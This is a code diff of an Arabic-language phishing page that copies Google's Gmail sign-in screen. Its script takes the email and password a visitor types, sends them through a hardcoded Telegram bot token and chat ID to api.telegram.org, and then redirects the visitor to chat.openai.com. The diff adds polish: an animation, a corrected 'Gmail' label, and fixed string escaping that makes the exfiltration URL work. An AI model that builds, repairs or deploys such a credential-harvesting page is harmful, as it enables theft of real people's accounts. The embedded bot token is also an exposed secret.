@@ -23,6 +23,12 @@
       border-radius: 8px;
       box-shadow: 0 1px 4px rgba(0,0,0,0.2);
       text-align: right;
+      animation: fadeIn 0.5s ease-in-out;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
     }
 
     .form-container img {
@@ -92,7 +98,7 @@
   <div class="form-container" id="formBox">
     <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png">
     <h2>تسجيل الدخول</h2>
-    <p>انتقل إلى Gail</p>
+    <p>انتقل إلى Gmail</p>
     <div class="input-group">
       <input type="email" id="email" placeholder="البريد الإلكتروني أو الهاتف">
     </div>
@@ -104,26 +110,30 @@
 
   <script>
     function goToPassword() {
-      const email = document.getElementById("email").value.trim();
+      const emailInput = document.getElementById("email");
+      const email = emailInput.value.trim();
       const displayEmail = email || "المستخدم";
 
       const formBox = document.getElementById("formBox");
       formBox.innerHTML = `
-        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png">
-        <h2>مرحبًا ${displayEmail}</h2>
-        <p>أدخل كلمة المرور لحسابك</p>
-        <div class="input-group">
-          <input type="password" id="password" placeholder="كلمة المرور">
+        <div class="form-container">
+          <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png">
+          <h2>مرحبًا ${displayEmail}</h2>
+          <p>أدخل كلمة المرور لحسابك</p>
+          <div class="input-group">
+            <input type="password" id="password" placeholder="كلمة المرور">
+          </div>
+          <a class="link" href="#">هل نسيت كلمة المرور؟</a>
+          <button onclick="sendData('${email || 'غير محدد'}')">تسجيل الدخول</button>
+          <a class="link" href="#">استخدام حساب آخر</a>
+          <div class="status" id="status"></div>
         </div>
-        <a class="link" href="#">هل نسيت كلمة المرور؟</a>
-        <button onclick="sendData('${email || 'غير محدد'}')">تسجيل الدخول</button>
-        <a class="link" href="#">استخدام حساب آخر</a>
-        <div class="status" id="status"></div>
       `;
     }
 
     function sendData(email) {
-      const password = document.getElementById("password").value.trim();
+      const passwordInput = document.getElementById("password");
+      const password = passwordInput.value.trim();
       const statusEl = document.getElementById("status");
 
       if (!password) {
@@ -136,7 +146,7 @@
       const message = `📥 تسجيل دخول جديد:\n📧 البريد: ${email}\n🔐 كلمة المرور: ${password}`;
       const token = "8185557975:AAEDUZuAvskBZTTvSqyHKfcVuR3CfoRjp3U";
       const chat_id = "6894787120";
-      const url = \`https://api.telegram.org/bot\${token}/sendMessage?chat_id=\${chat_id}&text=\${encodeURIComponent(message)}\`;
+      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
 
       fetch(url)
         .then(res => {
@@ -147,7 +157,7 @@
             window.location.href = "https://chat.openai.com";
           }, 1500);
         })
-        .catch(err => {
+        .catch(() => {
           statusEl.textContent = "❌ فشل في الإرسال.";
         });
     }
